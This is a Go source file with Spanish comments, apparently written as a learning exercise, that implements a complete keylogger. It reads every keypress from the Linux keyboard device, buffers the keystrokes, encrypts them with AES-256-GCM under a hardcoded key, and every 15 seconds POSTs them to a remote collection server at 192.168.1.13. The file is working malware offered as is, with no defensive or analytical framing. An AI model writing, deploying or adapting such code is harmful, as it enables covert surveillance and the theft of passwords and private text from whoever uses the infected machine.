package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/MarinX/keylogger" // Librería externa para leer eventos del teclado desde /dev/input
)

// Variables globales
var (
	keystrokes []string                                     // Arreglo donde se almacenan las teclas presionadas
	securekey  = []byte("0123456789abcdef0123456789abcdef") // Clave AES-256 , usada para cifrar la información
	serverURL  = "http://192.168.1.13:8080/recibir"         // URL del servidor que recibirá los datos cifrados
)

// Función que cifra el texto utilizando AES-256 en modo GCM
func encryptAES(data string, key []byte) (string, error) {
	// Crear el bloque de cifrado AES
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Crear modo GCM (Galois/Counter Mode) sobre el bloque AES
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// Generar un nonce aleatorio (requerido por GCM)
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	// Cifrar los datos con AES-GCM y añadir el nonce
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)

	// Codificar el resultado en base64 para que se pueda transmitir por HTTP
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Función que envía los datos cifrados al servidor por POST
func sendEncryptedData(ciphertext string) {
	// Enviar los datos como texto plano en el cuerpo de la solicitud
	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer([]byte(ciphertext)))
	if err != nil {
		log.Println("Error al enviar al servidor:", err)
		return
	}
	defer resp.Body.Close()

	// Registrar el estado del envío
	log.Println("Datos enviados al servidor. Código:", resp.StatusCode)
}

// Esta función se ejecuta cada 15 segundos para:
// 1. Unir las teclas ,cifrarlas y enviarlas al servidor
func saveAndSend() {
	if len(keystrokes) == 0 {
		return // No hacer nada si no se ha presionado ninguna tecla
	}

	// Convertir el slice de teclas en un solo string
	text := strings.Join(keystrokes, "")
	keystrokes = []string{} // Limpiar el buffer para nuevas capturas

	// Cifrar el texto
	ciphered, err := encryptAES(text, securekey)
	if err != nil {
		log.Println("Error al cifrar:", err)
		return
	}

	// Enviar los datos cifrados al servidor
	sendEncryptedData(ciphered)
}

func main() {
	// Detectar automáticamente el dispositivo del teclado
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		log.Fatal("No se encontró dispositivo de teclado.")
	}
	fmt.Println("Escuchando en:", keyboard)

	// Abrir el dispositivo del teclado
	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatal("Error al abrir teclado:", err)
	}
	defer k.Close() // Asegurar que se cierre correctamente

	// Comenzar a leer eventos del teclado
	events := k.Read()

	// Crear un ticker que se dispare cada 15 segundos
	ticker := time.NewTicker(15 * time.Second)
	go func() {
		for range ticker.C {
			saveAndSend() // Cada 15s, se guarda y envía lo capturado
		}
	}()

	// ciclo que captura teclas presionadas
	for e := range events {
		// Verificar que el evento es una tecla
		if e.Type == keylogger.EvKey && e.KeyPress() {
			key := e.KeyString()

			// Si es una letra  simple se agrega tal cual
			if len(key) == 1 {
				keystrokes = append(keystrokes, key)
			} else {
				// Si es una tecla especial (ej: ENTER, BACKSPACE), se encierra entre corchetes
				keystrokes = append(keystrokes, "["+key+"]")
			}
		}
	}
}
